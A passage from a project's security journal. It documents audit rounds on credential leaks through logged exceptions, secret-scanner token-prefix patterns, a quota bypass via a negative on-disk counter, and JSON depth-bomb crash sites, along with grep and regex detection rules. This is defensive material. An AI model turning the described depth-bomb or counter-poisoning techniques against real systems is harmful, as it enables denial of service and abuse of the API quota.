  (b) **Mutual-exclusion test rule for case-sensitive issuers**: when two patterns differ only in case (Stripe lowercase `sk_*` vs Twilio uppercase `SK<hex>`, GitHub `ghp_` vs hypothetical lookalike), the regression test MUST parametrise BOTH the matching form (asserts correct attribution) AND the lookalike form (asserts NO false-positive attribution as the other vendor). The shape lives in `tests/test_sentinel_secret_scanner_drift.py:test_secret_scanner_does_not_confuse_twilio_with_stripe`.

The fix shape mirrors `9c4e666`: append per-issuer regex tuples to `_KNOWN_TOKENS` with anchored word-boundary lookbehinds/lookaheads (`(?<![A-Za-z0-9])` / `(?![A-Za-z0-9])`) and strict body-length quantifiers; per-issuer reason strings are German-language to match the existing taxonomy. Combined with Round 1's five additions and the original taxonomy, `_KNOWN_TOKENS` now carries **27 specific issuer patterns** plus the generic high-entropy and bearer-shape fallbacks.

## 2026-05-08 - Clear-Text-Logging Drift Round 2: Three Sibling VOR Credential-Leak Sites the 2026-05-08 `scripts/` Sweep Stopped Naming
**Vulnerability:** The 2026-05-08 round closed the bare-`%s, exc` / `exc_info=True` / `logger.exception` patterns in **two** named cron-pipeline scripts (`scripts/update_vor_stations.py:587` and `scripts/update_vor_cache.py:173`/`:184`) but its prevention rule had explicitly enumerated **five** scripts that consume `vor_provider`-authenticated sessions: "five scripts in this repo … (`update_vor_stations.py`, `update_vor_cache.py`, `verify_vor_access_id.py`, `fetch_vor_haltestellen.py`, `enrich_station_aliases.py`)". The verdict line said "Most don't emit logs containing `RequestException` directly … but the two cron-driven cache refreshers do" — accurate for `enrich_station_aliases.py` (no network calls) and `fetch_vor_haltestellen.py:483` (POST with `accessId` in body, not URL — confirmed safe), but it skipped over three remaining open sites:

1. **`scripts/verify_vor_access_id.py:92`** — `LOGGER.error("VOR verification request failed: %s", exc)`. The script calls `apply_authentication(session)` → `fetch_content_safe(session, probe_url, params=..., timeout=...)`; `VorAuth.__call__` (`src/providers/vor.py:710`) injects the `accessId` query parameter into the prepared URL, and a network failure surfaces a `MaxRetryError` whose `__str__` embeds that URL. Logging the bare `exc` writes `accessId=<SECRET>` to stdout / errors.log / CI-runner output. Severity HIGH — identical leak shape to the just-fixed `update_vor_stations.py:587`. Reachable on every `wien-oepnv tokens verify vor` invocation that hits a flapping VOR upstream (TLS handshake, DNS hiccup, IP allowlist rotation), plus the `test-vor-api.yml` workflow path that runs daily.

2. **`src/cli.py:_run_script:83`** — `print(f"Fehler beim Ausführen von {script_name}: {e}", file=sys.stderr)`. The CLI runs every sub-command via `runpy.run_path` and catches anything that escapes with `except Exception as e:`; the f-string interpolates the bare exception into stderr. Today's sub-scripts all catch `RequestException` internally (so the IMMEDIATE blast radius is bounded), but this is the LAST line of defense — a future refactor that lets a URL-bearing exception escape any of the five vor-authenticated scripts re-enables the leak via the f-string. Same defense-in-depth class as the `exc_info=True` rule from the 2026-05-08 entry. Severity MEDIUM (defense-in-depth + latent).

3. **`scripts/fetch_vor_haltestellen.py:fetch_access_id:157`** — `log.debug("Discovered access ID %s from webapp config", aid)`. Different leak shape from #1/#2: not an exception path, but the *discovered credential value itself* logged as a `%s` argument. The accessId is observable at a public webapp config endpoint, so it is "secret-by-obscurity" at the source — but logging it (a) writes the credential into errors.log / GitHub Actions logs whenever debug logging is enabled, (b) makes it retroactively available via log archives, GitHub auto-issue submissions in `src/feed/reporting.py`, and CI artefact retention. Severity MEDIUM (debug-only, but defense-in-depth says never log credential values).

**Learning:** The 2026-05-08 entry's prevention rule was "the audit must walk all of them" (five named scripts), and item #1 above was *enumerated by name in the verdict line* — but the audit closed only the two scripts the round was actively touching. Same meta-pattern as Round 7 of the env-cap drift family (`LOG_BACKUP_COUNT` named in Round 6's prevention rule but deferred until Round 7), Round 11 of the `timedelta` family (`FRESH_PUBDATE_WINDOW_MIN` named in Round 9/10's remaining-candidates list but deferred until Round 11), and Round 5 of the JSON depth-bomb family (16 sites named in Round 4's enumeration but only 7 fixed). The prevention-rule lesson: when an audit *names* a sibling site as "covered" or "no-leak-because-X", the next round's PR must include a regression test that pins the named claim. For #1 and #2 the canonical fix is the same-shape replacement (`exc` → `type(exc).__name__`); for #3 the fix is broader — the credential value must never appear in any log argument, regardless of level. The CLI catch-all (#2) generalises the rule to **every framework-level catch-all that prints an exception** (CLI runners, shell wrappers, `subprocess` glue, web framework error handlers): each one is a clear-text-logging dataflow sink even when the immediate caller has its own try/except, because the catch-all is reached precisely when the inner handler doesn't run.

**Prevention:** Two reinforcing rules:
  (a) **Closing-checklist enumeration rule**: when a clear-text-logging round names a list of N sibling scripts and closes only K of them, the verdict line MUST cite the *post-fix state of every N-K deferred sibling* (e.g. "scripts X, Y are safe because they do not call session.get/post on a VOR-authenticated session"). The regression test for the round MUST include an AST-based static check for every named sibling, not just the fixed ones — so a future PR that adds a leak surface to any deferred sibling fails the suite at PR-review time. The walker shape lives in `tests/test_sentinel_vor_credential_leak.py:test_verify_vor_access_id_92_uses_post_fix_pattern` (per-site AST traversal that finds the relevant `try/except` and asserts no bare `exc` is positional-argued to a logger).
  (b) **Framework catch-all rule**: every `except Exception as <name>:` handler that lives in framework glue (CLI runners, subprocess wrappers, Flask/FastAPI error handlers, asyncio task callbacks) must follow the same `type(<name>).__name__` rule as direct credential-bearing handlers — even when the immediate caller has its own try/except. Grep `except Exception as \w+:` paired with `print(f|logger.\w+\(.*{\w+}\)|str\(\w+\)` in CLI / runner files; every match is a clear-text-logging dataflow sink. The static check shape: walk every `ExceptHandler` whose body contains a `print(...)` / `logger.\w+(...)` call, and reject any positional Name reference whose id matches the handler's bound variable.

The auto-discoverable invariants land in `tests/test_sentinel_vor_credential_leak.py` extended with three new tests: `test_verify_vor_access_id_92_uses_post_fix_pattern` (AST static check for Site 3), `test_cli_run_script_uses_post_fix_pattern` + `test_cli_run_script_post_fix_suppresses_secret` (AST + behavioural for Site 4), and `test_fetch_vor_haltestellen_does_not_log_aid_value` (AST for Site 5). The fixed pattern mirrors `61f2602` / `ed4631e` / the 2026-05-08 scripts/-sweep: replace `%s, exc` with `%s, type(exc).__name__`; replace credential-value logging with a length fingerprint.

## 2026-05-08 - VOR Quota-Bypass via Negative On-Disk Counter + Secret Scanner Drift Behind JWT/HF/DO/GitLab-Trigger Token Taxonomy
**Vulnerability:** Two orthogonal defense-in-depth gaps surfaced in the same audit round:

1. **VOR daily-quota bypass via negative `requests` value** (`src/providers/vor.py:load_request_count` line 1416 + `:save_request_count` line 1477). Pre-fix, both sites parsed the on-disk `data/vor_request_count.json` `requests` field via `int(value)` with NO lower-bound clamp. A poisoned file (compromised CI runner / partial flush + power loss / operator mis-edit) with `{"date": "<today>", "requests": -1000}` would silently bypass the runtime quota check `_limit_reached` in `scripts/update_vor_cache.py:87` (`todays_count >= MAX_REQUESTS_PER_DAY` is False for any negative count) AND be perpetuated by `save_request_count`'s under-lock disk re-read: it adds the run's delta to the negative `disk_count` and writes the offset back, so the tampered counter survives across runs. The script-level projected-usage cap (`PROJECTED_USAGE > 90: ABORT` at update_vor_cache.py:151) bounds single-run damage to ~3 stations × 24 runs = 72 reqs/day, but a sustained tampering campaign that re-poisons the file each midnight gives an attacker a defense-in-depth bypass against the contractually-strict VAO Start tier 100/day limit. Severity MEDIUM.

2. **Secret-scanner drift behind common token taxonomy**. The 2026-05-05 / 2026-05-06 rounds added Anthropic / OpenAI / GitHub non-PAT / SendGrid / Stripe / Slack token detectors and laid down the prevention rule "treat `_KNOWN_TOKENS` as an issuer-keyed table; whenever a new issuer is added, walk the issuer's full prefix taxonomy". Re-running the audit against the modern Python issuer landscape surfaced four still-missing classes: (a) **JWTs** (`eyJ<base64url>.<base64url>.<base64url>`) — the most common credential format in modern OAuth/OIDC flows; the dots between segments are outside the entropy fallback's `[A-Za-z0-9+/=_-]` alphabet, so without a specific pattern only ONE segment is matched at a time and the issuer attribution is lost; (b) **Hugging Face Access Tokens** (`hf_<32+ alphanumeric>`); (c) **DigitalOcean PATs** (`dop_v1_<64 hex>`) and **OAuth Refresh Tokens** (`doo_v1_<64 hex>`) — refresh tokens are higher-impact because they mint fresh PATs until manual revocation; (d) **GitLab Pipeline Trigger Tokens** (`glptt-<40 chars>`) — distinct from `glpat-`, lets a network adversary kick off CI pipelines and exposes protected-branch secrets to attacker-controlled jobs.

**Learning:** Two independent prior-round prevention patterns BOTH had drift surfaces this round:
  - The "shape-validate every on-disk integer counter" pattern was applied to the Places quota (`src/places/quota.py:115-130` rejects negative `counts`/`total_raw`/`daily_total`) but the *structurally-identical* VOR quota counter at `src/providers/vor.py` did NOT propagate the same isinstance + non-negative shape gate. Same `cast(...Dict, json.loads(...))` cross-tree drift pattern as Round 4 (Round 3-named subset, sixteen siblings remained).
  - The "issuer-keyed taxonomy walk" pattern from the 2026-05-05/05-06 rounds was correct in spirit but the closing checklist scoped to AI providers + GitHub variants; the broader issuer landscape (JWT — the most common cred format in modern web; HF/DO/GitLab-trigger — increasingly common Python project deps) was named in passing but never enumerated. The right closure for the issuer-keyed table is "every documented modern-Python issuer's primary token prefix is in `_KNOWN_TOKENS` with a distinct reason; absent that, the entropy fallback only flags one segment of multi-segment tokens".

**Prevention:**
  - **Cross-component shape-gate audit rule**: when a numeric on-disk state is added or modified anywhere in the repo (`requests`/`count`/`limit_*`/`daily_total`/etc.), grep for ALL siblings (`grep -nE 'int\(.*data\[.*\]|int\(.*\.get\(' src/`) and verify each parses through an `isinstance + bounds` guard. Concretely: the canonical defensive shape is `try: int_count = int(value); except: int_count = 0; int_count = max(0, min(int_count, REASONABLE_MAX))` — applied to every on-disk integer counter regardless of which module it lives in.
  - **Issuer-keyed taxonomy completion rule**: when adding a new issuer to `_KNOWN_TOKENS`, the verdict line MUST cite the inverse grep against the *modern Python project credential landscape* (JWT, HF, DO, GitLab variants, Twilio, Datadog, Cloudflare, Atlassian, Notion). Each multi-segment dot-separated format (JWT, SendGrid, Discord) MUST get its own pattern because the entropy fallback's alphabet excludes dots.

The auto-discoverable invariants land in `tests/test_sentinel_vor_quota_negative_bypass.py` (PoC test that pre-fix returns `count=-1000`, post-fix returns `count=0`; static check that both clamp sites stay in lockstep) and `tests/test_sentinel_secret_scanner_drift.py` (one PoC per new issuer + a static check that asserts each reason string is registered in `_KNOWN_TOKENS`).

## 2026-05-08 - Clear-Text-Logging Drift to `scripts/`: VOR `accessId` Leaks via `RequestException.__str__` and `exc_info=True`
**Vulnerability:** The 2026-05-08 CodeQL `py/clear-text-logging-sensitive-data` round (`61f2602` + `ed4631e`) closed eight log sinks across `src/` (including the hostname-via-DNS-error site in `src/utils/http.py:_resolve_hostname_safe`). The audit named those eight sites but did not extend the same sweep into `scripts/` — and **two** cron-pipeline scripts that fan out across the VOR API still logged raw `requests.RequestException` instances against a non-sanitising standard-library `logging.Logger`:
1. `scripts/update_vor_stations.py:587` — bare `log.warning("VOR API request for %s failed: %s", station_id, exc)`. After `VorAuth.__call__` (`src/providers/vor.py:701`) injects the VAO `accessId` query parameter into every prepared request whose URL starts with `VOR_BASE_URL`, the on-the-wire URL contains `?accessId=<SECRET>`. When the network layer fails (TLS handshake / `MaxRetryError` / SSL cert mismatch / TCP RST), `urllib3` wraps the underlying error into a `MaxRetryError` whose message is `HTTPSConnectionPool(host='X', port=443): Max retries exceeded with url: /location.name?id=…&accessId=<SECRET> (Caused by …)` — `requests` re-raises it as a `RequestException` subclass. Logging this exception via `%s` writes the secret verbatim to `errors.log` and CI-runner stdout. Severity HIGH: VAO Start tier credentials are 16-char access-IDs whose leak grants attacker access to the contractually-rate-limited departureBoard/location.name endpoints.
2. `scripts/update_vor_cache.py:173-176` — `logger.warning("VOR: API nicht erreichbar – behalte bestehenden Cache bei.", exc_info=True)`. `exc_info=True` writes the full traceback (including any `__context__` exception) to the formatted log record. The current `fetch_events` path doesn't propagate a chained URL-bearing `RequestException` (line 1841 raises from outside any except, line 1720/1728 is the quota guard with a clean message), so the IMMEDIATE blast radius is bounded — but defense-in-depth says the script must not RELY on that internal contract. A future refactor that re-raises `from exc` (or any new code path that lets a network error escape without first being scrubbed by `_log_error`/`_log_warning`) would silently re-enable the leak. Same fix applies to the `except Exception:` branch's `logger.exception(...)` at line 184 (shorthand for `logger.error(..., exc_info=True)`). Severity MEDIUM (latent + defense-in-depth).

The two leak surfaces are reachable on every cron run that hits a failing VOR upstream (transient connectivity loss, DNS hiccup, SSL cert renewal, IP allowlist rotation), so the write rate to `errors.log` is bounded only by the cron schedule. CI logs are visible to anyone with read access to the repository, and the auto-issue submission path in `src/feed/reporting.py` POSTs log excerpts to the GitHub issue tracker — both make the leak retroactively public.

**Learning:** The 2026-05-08 CodeQL fix's *learning* ("the inline regex whitelist applied to `hostname` was not recognised as a sanitiser barrier by CodeQL's clear-text-logging dataflow tracker; switch to `hashlib.sha256` + `type(exc).__name__`") was applied to ONE file (`src/utils/http.py`). The clear-text-logging dataflow concern is *cross-tree* — every script that calls `session.get(VOR_BASE_URL + …)` after `VorAuth` runs is a candidate, and there are five scripts in this repo that consume `vor_provider`-authenticated sessions (`update_vor_stations.py`, `update_vor_cache.py`, `verify_vor_access_id.py`, `fetch_vor_haltestellen.py`, `enrich_station_aliases.py`). The audit must walk all of them. Most don't emit logs containing `RequestException` directly — the inner try/excepts in `fetch_vor_haltestellen.fetch_candidates` use POST with `accessId` in the body (no URL leak surface) — but the two cron-driven cache refreshers do. Same `src/`-vs-`scripts/` drift pattern as JSON depth-bomb Round 3-5 ("perimeter clean" verdicts that scope to one tree silently miss functionally-identical code in sibling trees).

The `exc_info=True` / `logger.exception` pattern is materially different from `logger.warning("...: %s", exc)`: it writes the FULL traceback chain via Python's default exception formatter, which serialises every linked exception's `__str__` plus the source line. So the surface is *broader* than just the bare `%s` formatting — any logger call with `exc_info=True` (or its `logger.exception` shorthand) downstream of a `RequestException` raised by a VOR-authenticated session is in scope.

**Prevention:** Two reinforcing rules:
  (a) **Cross-tree audit rule for clear-text-logging dataflow**: when a CodeQL `py/clear-text-logging-sensitive-data` fix lands on `src/`, the same audit MUST grep `scripts/` for sibling sinks. The pattern this round: `git grep -nE 'log(ger)?\.\w+\(.*%s.*,\s*exc\)|logger\.exception\(|exc_info=True'` paired with `scripts/update_vor_*` (any cron-driven script that builds a VOR-authenticated session). Every match must be paired with the post-VorAuth URL flow check: does this script call `session.get(VOR_BASE_URL + …)`, and if yes, does the exception logging suppress the URL?
  (b) **Defense-in-depth for `exc_info=True`**: even when the IMMEDIATE blast radius is bounded by an internal contract (e.g., `fetch_events` doesn't propagate URL-bearing exceptions today), `exc_info=True` is broadcast-mode logging that surfaces every `__cause__`/`__context__` chain element. Treat it as forbidden in any handler that catches an exception type that might carry credentials in its message — instead, log `type(exc).__name__` to preserve the failure-mode diagnostic without the message text.

The fix shape mirrors `61f2602` / `ed4631e`: replace `%s, exc` with `%s, type(exc).__name__`; replace `logger.warning(..., exc_info=True)` and `logger.exception(...)` with a non-`exc_info`-bearing call that inlines `type(exc).__name__`. Auto-discoverable invariants land in `tests/test_sentinel_vor_credential_leak.py`: PoC tests demonstrate the pre-fix leak, post-fix tests assert the secret is suppressed, and AST-based static-checks reject any future PR that re-introduces `, exc)` or `exc_info=True` / `logger.exception` in the named handlers.

**Companion regression test (Round 5 follow-through):** This round also lands the programmatic JSON parser audit walker that the Round 5 prevention rule recommended (`tests/test_sentinel_json_audit_walker.py`). Walks every `*.py` in `src/` and `scripts/`, finds every `json.loads`/`json.load`/`response.json()` call via Python AST analysis, locates the smallest enclosing `try` block, and asserts each `except` clause includes `RecursionError`, `RuntimeError`, `Exception`, or `BaseException`. Any future PR that adds a JSON parser without RecursionError-tolerant coverage fails the walker at PR-review time — closing the named-list-vs-programmatic-walker gap that recurred Round 1 → Round 5.

## 2026-05-08 - JSON Depth-Bomb Drift Round 5: Round 4's Sixteen-Site Enumeration Still Missed Two Cron-Pipeline Siblings
**Vulnerability:** Round 4's commit (`513dcb4`) extended the enumeration grep across `src/` and `scripts/` and added `RecursionError` (and the missing `json.JSONDecodeError`) coverage to sixteen sites. The Round 4 journal entry's verdict stated "Combined with Round 2 (8 network-sourced sites), Round 3 (7 on-disk siblings), and now Round 4 (16 more on-disk siblings), the suite covers **31 documented JSON parser sites** across the whole repo." But re-running the inverse enumeration grep with a parser-aware walker (Python script that pairs every `json.loads`/`json.load`/`response.json()` call with its enclosing `try`/`except` clause and flags any whose tuple lacks `RecursionError`-tolerant coverage) returned **two further open sites**, both inside the `update_all_stations.py` cron pipeline:
1. `scripts/update_vor_stations.py:merge_into_stations` (line 813) — pre-merge existing-state read for `data/stations.json`. Pre-fix caught **only `FileNotFoundError`**, so a regular malformed `stations.json` already crashed the VOR merge, never mind a depth-bomb. The Round 4 journal *explicitly named* the sibling `scripts/update_wl_stations.py:merge_into_stations` (line 584) as item #7 ("caught only `FileNotFoundError`: a regular malformed `stations.json` already crashed the WL merge here, never mind a depth-bomb. This was a pure missed-catch, not a `RecursionError` drift.") and fixed it — but the structurally-identical VOR analog was missed by the named-list audit. The script is invoked via `update_all_stations.py:subprocess.run(check=True)`, so any unhandled exception raises `CalledProcessError` and aborts the entire station-directory cron *after* the VOR API quota has already been debited for that run.
2. `scripts/update_all_stations.py:_count_polygon_vertices` (line 241) — diff-time reader of `data/LANDESGRENZEOGD.json`. Pre-fix caught `(OSError, json.JSONDecodeError)` but not `RecursionError`. Called at line 405 from `main()` *after* the merged stations.json has already been atomically written; an unhandled `RecursionError` propagates out of `_build_heartbeat` → `main()` and crashes the orchestrator with an unhandled traceback, leaving partial state and no heartbeat record of what just happened.
**Learning:** The Round 4 prevention rule named two reinforcing rules — (a) the audit-completion rule (verdict cites the *output* of the inverse enumeration grep) and (b) the module-import-time rule. Round 4 *did* cite a number ("sixteen open sites") but the closing-checklist methodology was still naming-driven (the round committed a named-list of fixed sites, then cross-referenced the prior journal's "still-open" list). Running an actual programmatic walker — Python AST-style analysis that pairs every parse call with its enclosing `except` tuple — surfaces sites the human-curated named list missed. Specifically: `update_vor_stations.merge_into_stations` was the WL-`merge_into_stations` analog (Round 4's item #7), structurally identical and in the same cron pipeline, but lived in a *different* script that the audit pass apparently didn't grep when it landed on the WL fix. `_count_polygon_vertices` was the orchestrator's *second* on-disk loader (the orchestrator's `_load_stations` was Round 4's item #8, but it has a separate sibling polygon counter that the audit walked past). The meta-pattern that recurred Round 1 → Round 4: *partial closure with named-list verdicts*. Round 5 closes by switching the closing-grep methodology from "compare to named list" to "programmatic walker that returns zero hits."
**Prevention:** Replace the audit-completion rule's "verdict cites grep output" with "verdict runs a programmatic walker (e.g. `tests/_audit_json_parser_recursion_coverage.py` shape: walk every `*.py` in `src/` and `scripts/`, find every `json.loads`/`json.load`/`response.json()` call, find the smallest enclosing `try` block at lower indent, walk forward to find the matching `except` clauses, assert each clause's tuple includes `RecursionError`, `Exception`, or `BaseException`). Any future `json.loads` addition that lacks the catch fails the walker, regardless of whether the journal named the file. The auto-discoverable smoke-test pattern for Round 5 lives in `tests/test_sentinel_json_depth_bomb_round5.py` (mirrors the Round 4 file's per-site PoC pattern) — combined with the prior rounds' suites the canonical contract now covers **33 documented JSON parser sites** repo-wide. The two cron-pipeline siblings closed in this round share a common shape: they live in `scripts/` but are invoked via `subprocess.run(check=True)` from a parent orchestrator (`update_all_stations.py`), so any unhandled exception escalates to `CalledProcessError` and aborts the whole pipeline. Future audits should treat the `scripts/update_all_stations.py:_SCRIPT_ORDER` chain as a single blast radius — any parser failure inside any sub-script aborts the orchestrator, so every parser there must inherit the canonical depth-bomb defence.

## 2026-05-07 - JSON Depth-Bomb Drift Round 4: Round 3 Closed on a Named Subset, Sixteen Sibling On-Disk Parsers Stayed Open
**Vulnerability:** Round 3's commit (`55009db`) explicitly enumerated seven covered files (`src/places/tiling.py`, `src/utils/cache.py`, `src/utils/stations.py`, `src/places/quota.py`, `src/places/merge.py`, `scripts/update_station_directory.py:_parse_bounding_box`) and the prevention rule said "the round closes only when the enumeration grep returns zero remaining sites in `src/` and `scripts/`" — but the actual two-pass enumeration grep across both trees still returned **sixteen open sites** that retained the pre-canonicalisation `except (json.JSONDecodeError, [OSError | FileNotFoundError])` shape (or no try/except at all). Every site is on-disk-source; every site can be reached by an attacker who plants a 5000-deep nested-array payload via compromised CI runner, corrupted previous run, or operator-controlled config:
1. `src/providers/vor.py:_load_station_name_map` (line 413) — **CRITICAL: module-import time**. The call site `STATION_NAME_MAP = _load_station_name_map()` (line 447) runs unconditionally on `import src.providers.vor`, so a depth-bombed `data/vor-haltestellen.mapping.json` raises `RecursionError` at import time and kills every CLI / feed entry-point that imports the VOR provider. The journal's "Cross-Script Drift Round 2" entry already warned about this exact escalation pattern but didn't add the `RecursionError` catch.
2. `src/providers/vor.py:load_request_count` (line 1381) and `:save_request_count` (line 1449) — both caught `(FileNotFoundError, OSError, json.JSONDecodeError)` but not `RecursionError`. The save path's inner read-back-under-lock is especially insidious: a depth-bomb in `data/vor_request_count.json` propagates `RecursionError` out of the exclusive `file_lock` block, escapes the broad `except (OSError, TimeoutError)` lock-error handler (RecursionError is `RuntimeError → Exception`, not `OSError`), and crashes the cron mid-quota-debit. The next run reads stale or zero quota state and is free to make another 100 requests, breaching the contractual VAO Start tier limit.
3. `src/utils/stations_validation.py:_load_stations` (line 261) — caught only `json.JSONDecodeError`. Used by `scripts/validate_stations.py`; pre-fix a depth-bomb crashes the validator with an unhandled traceback instead of the canonical exit-1 `StationValidationError` path.
4. `scripts/enrich_station_aliases.py` — three sites (`_load_vor_mapping:305`, `_load_pendler_alternative_names:378`, `main:717`), all caught only `json.JSONDecodeError`. The script runs in `update_all_stations.py` via `subprocess.run(check=True)` so any unhandled `RecursionError` raises `CalledProcessError` and aborts the whole station-directory cron.
5. `scripts/update_station_directory.py` — four sites (`_load_existing_station_entries:476`, `_load_vor_name_to_id_map:924`, `load_pendler_station_ids:1288`, `load_pendler_name_candidates:1333`), same blast radius as #4.
6. `scripts/update_wl_stations.py:load_vor_mapping` (line 343) — caught `(FileNotFoundError, json.JSONDecodeError)` but not `RecursionError`. Same cron-pipeline blast radius as #4/#5.
7. `scripts/update_wl_stations.py:merge_into_stations` (line 584) — caught **only `FileNotFoundError`**: a regular malformed `stations.json` already crashed the WL merge here, never mind a depth-bomb. This was a pure missed-catch, not a `RecursionError` drift.
8. `scripts/update_all_stations.py:_load_stations` (line 99) — orchestrator's diff-detection reader; caught `(OSError, json.JSONDecodeError)` but not `RecursionError`. A depth-bomb propagates past `main()` and crashes the run AFTER the merged stations file is written, masking the real cause.
9. `scripts/fetch_google_places_stations.py:_parse_bounding_box` (line 152) — had **NO try/except at all** around `json.loads(raw)`. A depth-bomb in `BOUNDINGBOX_VIENNA` env propagates out, the caller's broad `except Exception` swallows it as a confusing "Configuration error" warning that masks the real cause (same pattern Round 3 fixed for the sibling `update_station_directory.py:_parse_bounding_box`).
10. `scripts/validate_vor_mapping.py:main` (line 16) — caught only `json.JSONDecodeError`. Lower blast radius (single-call diagnostic), but completes the canonical "every `json.loads` site catches `RecursionError`" contract repo-wide.
**Learning:** The Round 3 prevention rule was *correct in spirit* ("the round closes only when the enumeration grep returns zero remaining sites in `src/` and `scripts/`") but the round's commit message named seven covered files and the audit appears to have *stopped at the named list* rather than re-running the inverse grep. Same meta-pattern as Round 7 (`LOG_BACKUP_COUNT`) and Round 11 (`FRESH_PUBDATE_WINDOW_MIN`) — when a round names sibling sites in its prevention rule but only fixes a subset, the next-round audit walks past the deferred sites because the audit verdict named them as "covered later." The right closure for the JSON depth-bomb family is "every `json.loads`/`json.load`/`.json()` site MUST have an enclosing `except` with `RecursionError` (or generic `except Exception:`), regardless of source — and the round closes only when `git grep -nE 'json\.loads\(|json\.load\(|\.json\(\)' src/ scripts/` returns zero hits whose enclosing `except` tuple lacks `RecursionError`-catching exception class". Concretely: this Round 4 pass added the catch to **sixteen** sites Round 3 missed; the auto-discoverable smoke-test pattern in `tests/test_sentinel_json_depth_bomb_round4.py` walks each documented site with a 5000-deep nested payload and asserts the canonical fallback (returns empty / raises documented domain exception / overwrites corrupt state) instead of propagating `RecursionError`. Combined with Round 2 (8 network-sourced sites), Round 3 (7 on-disk siblings), and now Round 4 (16 more on-disk siblings), the suite covers **31 documented JSON parser sites** across the whole repo.
**Prevention:** Two reinforcing rules:
  (a) **Audit-completion rule**: when a round closes, the verdict line MUST cite the *output* of the inverse enumeration grep (`git grep -nE 'json\.loads\(|json\.load\(|\.json\(\)' src/ scripts/`), not just the list of sites the fix actually touched. If the grep output is non-empty, the round is not done — extend the fix or document each remaining site with an explicit deferred-fix journal note (with same-day follow-up filed).
  (b) **Module-import-time call sites are CRITICAL**: any `^[A-Z_]+ = _load_...()` / `^[A-Z_]+ = json.load...()` at column 0 in `src/` is a module-import-time loader. Its enclosing function MUST handle every parser failure mode (`json.JSONDecodeError`, `OSError`, `RecursionError`, plus shape gates) with a defaulted return — an unhandled exception at import time is *worse* than the same exception at call time because it crashes every `import` before any defensive caller can run. `STATION_NAME_MAP = _load_station_name_map()` in `src/providers/vor.py:447` is the canonical example surfaced by this round; the journal entry "Cross-Script Drift Round 2" (2026-05-07) introduced this rule for shape guards, and Round 4 extends it to depth-bomb defence.

## 2026-05-07 - JSON Depth-Bomb Drift Round 3: On-Disk + Env-Source Siblings Were Excluded from Round 2's Network-Only Sweep
**Vulnerability:** Round 2 closed every *network-sourced* JSON parser without a `RecursionError` catch (`src/feed/reporting.py`, `src/places/client.py`, `scripts/update_vor_stations.py`, `scripts/fetch_vor_haltestellen.py`, `scripts/verify_vor_access_id.py`). The two-pass enumeration grep from Round 2 ("every `json.loads`/`json.load`/`.json()` site paired with its enclosing `except`, flagging anything without `RecursionError`") *was* run against `src/` and `scripts/` — but the round's closing checklist scoped the *fix* to network-touched parsers only, deferring on-disk and env-source siblings to "lower blast radius / future round." The deferred set turned out to contain seven still-open drift surfaces:
1. `src/places/tiling.py:65` and `:75` — `load_tiles_from_env` / `load_tiles_from_file` had **NO** try/except around `json.loads` at all. CRITICAL because the file-path call site in `update_station_directory.py:_enrich_with_google_places` catches only `(OSError, ValueError)` (line 727) and the `BOUNDINGBOX_VIENNA` sibling catches only `ValueError` (line 742) — `RecursionError` is in neither tuple, so a depth-bomb in `PLACES_TILES` env or an operator-supplied tiles file propagates out and kills the cron pipeline. The `fetch_google_places_stations.py` caller wraps in `except Exception` so the script there wouldn't crash but emits a confusing "Configuration error" that masks the real cause.
2. `src/utils/cache.py:153` (`read_cache`), `:273` (`write_cache` data-degradation guard), `:359` (`read_status`) — all three caught `(json.JSONDecodeError, OSError)` but not `RecursionError`. A depth-bomb in `cache/<provider>/events.json` or `last_run.json` (left by a corrupted previous run, planted by a compromised CI runner, or written during a partial flush followed by power loss) propagates `RecursionError` out of the orchestrator's main `try` block and crashes the entire feed build. The `write_cache` site is especially insidious: the data-degradation guard reads the EXISTING cache before overwriting; a depth-bomb in the existing file would crash mid-write rather than treat the unparseable cache as overwriteable.
3. `src/utils/stations.py:252` (`_vienna_polygons`), `:406` (`_station_entries`) — both `@lru_cache(maxsize=1)` decorated; both caught `(OSError, json.JSONDecodeError)` but not `RecursionError`. A depth-bomb in `data/vienna_polygon.json` or `data/stations.json` would propagate out of the loader and crash every station enrichment / Vienna geo-fence check downstream.
4. `src/places/quota.py:90` (`MonthlyQuota.load`) and `src/places/merge.py:71` (`load_stations`) — both had **NO** try/except. Lower blast radius (the `MonthlyQuota.load` call site wraps in `except Exception` and `load_stations` runs inside the same script-level catch in `update_station_directory.py`), but the canonical defence-in-depth contract is for the loader itself to surface a clean `ValueError` so a future caller without a broad catch inherits a safe default.
5. `scripts/update_station_directory.py:633` (`_parse_bounding_box`) — caught only `json.JSONDecodeError`. The outer `except ValueError` at `_enrich_with_google_places:742` does NOT catch `RecursionError`, so a depth-bomb in `BOUNDINGBOX_VIENNA` env propagates out and crashes the cron.
**Learning:** When a "perimeter clean" round closes only the network-sourced parsers and defers the on-disk/env-source siblings, the deferred set must be enumerated explicitly with a same-day batch follow-up — otherwise the next round's grep walks past the deferred sites because the audit verdict named them as "covered later." Same meta-pattern as Round 7 of the env-cap drift family (LOG_BACKUP_COUNT was named in Round 6's prevention rule but deferred until Round 7) and Round 11 of the `timedelta` family (FRESH_PUBDATE_WINDOW_MIN was named in Round 9/10's remaining-candidates list but deferred until Round 11). The right closure for the JSON depth-bomb family is "every `json.loads`/`json.load`/`.json()` site MUST have an enclosing `except` with `RecursionError`, regardless of source (network/disk/env)" — and the round closes only when the enumeration grep returns zero remaining sites in `src/` and `scripts/`.
**Prevention:** Extend the Round 2 two-pass enumeration grep to ALL json-parser sites without filtering by source. Concretely: `git grep -nE 'json\.loads\(|json\.load\(|\.json\(\)'` in `src/` and `scripts/`, then for each match read the enclosing function's `except` clause; flag any whose tuple doesn't include `RecursionError`. The auto-discoverable smoke-test pattern (`tests/test_sentinel_json_depth_bomb_ondisk.py` introduced in this round) walks every documented on-disk / env-source site with a 5000-deep nested payload and asserts the canonical fallback runs (returns empty / raises documented `ValueError` / overwrites corrupt cache) instead of propagating `RecursionError`. Combined with `tests/test_sentinel_json_depth_bomb.py` from Round 2, the suite now covers: network-sourced (8 sites), on-disk (7 sites), env-source (3 sites). Future `json.loads` / `response.json()` additions in any tree must mirror the canonical exception tuple `(ValueError, json.JSONDecodeError, RecursionError)` or extend it (e.g. `+OSError` for file reads). When any sweep round closes, the verdict line MUST enumerate every parse-site source class (network / disk / env) it covered and explicitly call out any deferred siblings — silent "coming next round" deferrals create the multi-round drift this entry documents.

## 2026-05-07 - JSON Depth-Bomb Drift Round 2: Five More Sibling Sites Inherited the Pre-Canonicalisation `except ValueError` Shape
